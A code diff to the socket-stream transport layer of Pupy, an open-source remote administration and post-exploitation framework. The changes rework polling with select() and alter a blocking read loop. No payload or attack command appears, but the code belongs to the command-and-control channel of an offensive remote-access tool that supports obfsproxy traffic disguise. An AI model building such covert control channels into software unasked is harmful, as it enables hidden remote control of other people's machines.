@@ -1,4 +1,4 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 """ abstraction layer over rpyc streams to handle different transports and integrate obfsproxy pluggable transports """
@@ -6,7 +6,7 @@
 __all__=["PupySocketStream", "PupyUDPSocketStream"]
 
 import sys
-from rpyc.core import SocketStream
+from rpyc.core import SocketStream, Connection
 from ..buffer import Buffer
 import socket
 import time
@@ -15,7 +15,6 @@ import logging
 import traceback
 from rpyc.lib.compat import select, select_error, BYTES_LITERAL, get_exc_errno, maxint
 import threading
-
 
 class addGetPeer(object):
     """ add some functions needed by some obfsproxy transports"""
@@ -70,12 +69,19 @@ class PupySocketStream(SocketStream):
             raise EOFError("connection closed by peer")
         self.buf_in.write(BYTES_LITERAL(buf))
 
+    # The root of evil
     def poll(self, timeout):
-        return len(self.upstream)>0 or self.sock_poll(timeout)
+        # Just ignore timeout
+        result = ( len(self.upstream)>0 or self.sock_poll(timeout) )
+        return result
 
     def sock_poll(self, timeout):
         with self.downstream_lock:
-            if super(PupySocketStream, self).poll(timeout):
+            to_read, _, to_close = select([self.sock], [], [self.sock], timeout)
+            if to_close:
+                raise EOFError('sock_poll error')
+
+            if to_read:
                 self._read()
                 self.transport.downstream_recv(self.buf_in)
                 return True
@@ -92,12 +98,8 @@ class PupySocketStream(SocketStream):
             if len(self.upstream)>=count:
                 return self.upstream.read(count)
             while len(self.upstream)<count:
-                self.sock_poll(0.1)
-                #self._read()
-
-                #it seems we can actively wait here with only perf enhancement
-                #if len(self.upstream)<count:
-                #    self.upstream.wait(0.1)#to avoid active wait
+                if not self.sock_poll(None) and self.closed:
+                    return None
 
             return self.upstream.read(count)
         except Exception as e:
@@ -208,5 +210,3 @@ class PupyUDPSocketStream(object):
             #The write will be done by the _upstream_recv callback on the downstream buffer
         except Exception as e:
             logging.debug(traceback.format_exc())
-
-
